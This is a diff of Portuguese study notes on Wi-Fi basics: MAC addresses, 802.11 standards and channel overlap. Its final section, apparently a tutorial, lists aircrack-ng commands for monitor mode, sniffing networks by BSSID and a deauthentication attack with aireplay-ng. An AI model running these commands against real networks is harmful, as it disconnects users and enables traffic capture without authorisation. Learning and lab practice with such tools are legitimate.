@@ -22,8 +22,7 @@ todas elas atuam em frequencias diferentes...
 
 
 
-
-				MAC ADDRESS
+# MAC ADDRESS
 
 MAC ADDRESS = ENDEREÇO FISICO DE QUALQUER DISPOSITIVO QUE SE CONECTA NA REDE, VEM DE FABRICA DE CADA DISPOSITIVO
 
@@ -50,10 +49,8 @@ ax            |	 2019            |     2,4/5 GHz    |
 
 
 
-				CANAIS
 
-
-
+# CANAIS
 
 Conexeção wifi opera em canais, faixa de frequencias diferentes
 geralmente as redes atuais operam nas frequencias de 2,4 Ghz, mas existe sub-frequencias que estão dividindo os canais, cada canal é uma sub divisão
@@ -72,10 +69,16 @@ Canal 9   = 2.452
 Canal 10  = 2.457
 Canal 11  = 2.462    longe
 
+
+os canais tem uma largura de banda de 22 MHz, e eles se intrelassam, 
+um canal esta sempre interferindo no outro, os canais que tem a maior
+distancia um do outro é o 1,6 e 11 por isso se for fazer uma configuração 
+em roteadores proximos usar esses canais
+ainda existira interferencia, porem sera minima
+
 ~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-os canais tem uma largura de banda de 22 MHz, e eles se intrelassam, um canal esta sempre interferindo no outro, os canais que tem a maior distancia um do outro é o 1,6 e 11 por isso se for fazer uma configuração em roteadores proximos usar esses canais
-ainda existira interferencia, porem sera minima
+
 
 
 
@@ -310,23 +313,23 @@ airodump-ng wlan0mon -c <<Canal>> --bssid <BSSID da rede>>
 
 
 
-Linha de comando:
+### Linha de comando:
 
 Mostrando dispositivos de rede:
 
-# ifconfig
+ `ifconfig`
 Ativando interface de monitoramento:
 
-# airmon-ng start wlan0
+ `airmon-ng start wlan0`
 Monitorando o ar:
 
-# airodump-ng wlan0mon
+ airodump-ng wlan0mon
 Filtrando monitoramento
 
-# airodump-ng wlan0mon -c <canal> --bssid <bssid da rede>
+ airodump-ng wlan0mon -c <canal> --bssid <bssid da rede>
 Ataque de desautenticação
 
-# aireplay-ng -0 10 -a <bssid> wlan0mon
+ aireplay-ng -0 10 -a <bssid> wlan0mon
 
 
 
